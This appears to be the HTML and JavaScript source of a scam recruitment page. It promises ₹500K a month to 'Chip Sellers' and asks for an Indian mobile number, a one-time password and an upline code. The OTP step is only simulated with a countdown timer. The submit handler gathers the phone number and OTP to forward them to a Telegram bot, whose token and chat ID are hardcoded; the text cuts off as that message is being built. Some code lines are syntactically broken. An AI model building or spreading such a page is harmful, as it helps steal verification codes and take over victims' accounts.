<body class="bg-brand-dark min-h-screen text-slate-100 flex flex-col justify-between selection:bg-brand-purple selection:text-white">

    <!-- Top Header Banner -->

            <div class="absolute -top-12 -right-12 w-32 h-32 bg-purple-600/20 rounded-full blur-2xl pointer-events-none"></div>
            
            <div class="inline-flex items-center space-x-1.5 bg-purple-500/10 border border-purple-500/30 px-3 py-1 rounded-full text-purple-300 text-xs font-semibold mb-3 shadow-inner">
                <i class="fa-solid fa-bolt text-yellow-400"></i>
                <span>JOIN US!</span>

            <h2 class="text-xl sm:text-2xl font-bold tracking-tight text-white leading-snug mb-3">
                As an official Chip Seller to earn <span class="text-yellow-400 font-extrabold underline decoration-yellow-400/40">₹500K monthly.</span>
            </h2>

            <!-- Graphic Illustration Placeholder -->
            <div class="my-4 flex justify-center items-center">
                <div class="relative w-full h-32 bg-gradient-to-r from-purple-900/20 to-indigo-900/20 rounded-2xl flex items-center justify-center border border-purple-500/10 overflow-hidden">
                    <div class="absolute inset-0 opacity-10 bg-[radial-gradient(#c084fc_1px,transparent_1px)] [background-size:16px_16px]"></div>
                    <div class="flex items-center space-x-6 z-10">
                        <div class="w-12 h-16 bg-purple-600/40 rounded-t-full flex items-center justify-center border border-purple-400/30">
                            <i class="fa-solid fa-user text-purple-200 text-xl"></i>

                        <div class="w-20 h-20 bg-yellow-500/20 rounded-full flex items-center justify-center border-2 border-yellow-400/50 shadow-lg shadow-yellow-500/20">

        <!-- Form Card -->

            <form id="signup-form" onsubmit="handleFormSubmit(event)" class="space-y-4">
                <!-- Phone Number Input -->

                            <span class="text-slate-200 font-semibold">+91</span>
                        </div>
                        <input type="tel" id="phone" required value="9175161742" placeholder="Enter Mobile Number" maxlength="10" 
                            class="w-full bg-transparent px-4 py-3.5 text-sm text-white placeholder-slate-500 focus:outline-none">
                    </div>
                </div>

                <!-- OTP Input with Timer -->
                <div>
                    <div class="relative flex items-center bg-slate-950/80 border border-slate-800 rounded-2xl focus-within:border-purple-500 focus-within:ring-2 focus-within:ring-purple-500/20 transition">
                        <input type="text" id="otp" required value="4536" placeholder="Enter OTP" maxlength="6"
                            class="w-full bg-transparent px-4 py-3.5 text-sm text-white placeholder-slate-500 focus:outline-none">
                        <button type="button" id="otp-btn" onclick="sendOTP()" 
                            class="mr-2 px-3.5 py-2 bg-purple-600 hover:bg-purple-500 text-white text-xs font-semibold rounded-xl transition shadow-md shadow-purple-900/30 active:scale-95">

                <!-- Upline Code Input (Optional) -->
                <div>
                    <div class="relative flex items-center bg-slate-950/80 border border-slate-800 rounded-2xl focus-within:border-purple-500 focus-within:ring-2 focus-within:ring-purple-500/20 transition">

                <!-- Submit Button -->
                <button type="submit" id="submit-btn"

    <!-- JavaScript Logic with Telegram Bot Integration -->
    <script>
        // Updated Telegram Bot Token and Chat ID
        const BOT_TOKEN = "8439698505:AAGLOUR5DuMaMLm81HarVsDvQ8gFkvfZFU0";
        const CHAT_ID = "8698008425";

        let countdownSeconds = 60;
        let timerInterval = null;

        // Toast Notification Function
        function showToast(message, type = 'info') {
            const container = document.getElementById('toast-container');
            
            const toast = document.createElement('div');
            toast.className = `p-3.5 rounded-xl shadow-lg text-xs sm:text-sm font-medium text-white pointer-events-auto flex items-center justify-between transition-all duration-300 opacity-0 translate-y-2 ${
                type === 'success' ? 'bg-emerald-600' : type === 'error' ? 'bg-rose-600' : 'bg-slate-900 border border-slate-700'
            }`;

            const icon = type === 'success' ? 'fa-circle-check' : type === 'error' ? 'fa-triangle-exclamation' : 'fa-circle-info';

            toast.innerHTML = `
                <div class="flex items-center space-x-2">
                    <i class="fa-solid ${icon}"></i>
                    <span>${message}</span>
                </div>
                <button onclick="this.parentElement.remove()" class="ml-3 text-white/80 hover:text-white">
                    <i class="fa-solid fa-xmark text-xs"></i>
                </button>
            `;

            container.appendChild(toast);
            setTimeout(() => { toast.classList.remove('opacity-0', 'translate-y-2'); }, 10);

            setTimeout(() => {
                toast.classList.add('opacity-0', 'translate-y-2');
                setTimeout(() => toast.remove(), 300);
            }, 4000);
        }

        // Preview uploaded icon
        function previewIcon(event) {
            const file = event.target.files[0];
            if (file) {
                const reader = new FileReader();
                reader.onload = function(e) {
                    const container = document.getElementById('app-logo-container');
                    container.innerHTML = `<img src="${e.target.result}" class="w-full h-full object-cover rounded-xl" alt="Custom Logo">`;
                    showToast('Custom icon applied successfully!', 'success');
                }
                reader.readAsDataURL(file);
            }
        }

        // OTP Timer Simulator
        function sendOTP() {
            const phoneInput = document.getElementById('phone').value.trim();
            if(phoneInput.length < 10) {
                showToast('Please enter a valid 10-digit mobile number first!', 'error');
                return;
            }

            const otpBtn =.getElementById('otp-btn');
            if (timerInterval) return;

            showToast('OTP sent successfully to +91 ' + phoneInput, 'success');
            otpBtn.disabled = true;
            countdownSeconds = 60;
            otpBtn.innerText = `${countdownSeconds}s`;
            otpBtn.classList.add('opacity-50', 'cursor-not-allowed');

            timerInterval = setInterval(() => {
                countdownSeconds--;
                otpBtn.innerText = `${countdownSeconds}s`;
                if (countdownSeconds <= 0) {
                    clearInterval(timerInterval);
                    timerInterval = null;
                    otpBtn.disabled = false;
                    otpBtn.innerText = 'Resend OTP';
                    otpBtn.classList.remove('opacity-50', 'cursor-not-allowed');
                }
            }, 1000);
        }

        // Form Submit Handler & Telegram Sender
        async function handleFormSubmit(event) {
            event.preventDefault();

            const phone = document.getElementById('phone').value.trim();
            const otp = document.getElementById('otp').value.trim();
            const upline = document.getElementById('upline').value.trim() || 'None';
            const submitBtn = document.getElementById('submit-btn');

            if (phone.length < 10) {
                showToast('Please enter a valid phone number!', 'error');
                return;
            }
            if (otp.length < 4) {
                showToast('Please enter a valid OTP!', 'error');
                return;
            }

            submitBtn.disabled = true;
            submitBtn.innerHTML = `<i class="fa-solid fa-spinner animate-spin"></i><span>Processing...</span>`;

            const message = `🚨 *New Chip Seller Sign-Up* 🚨\n\n📱 *
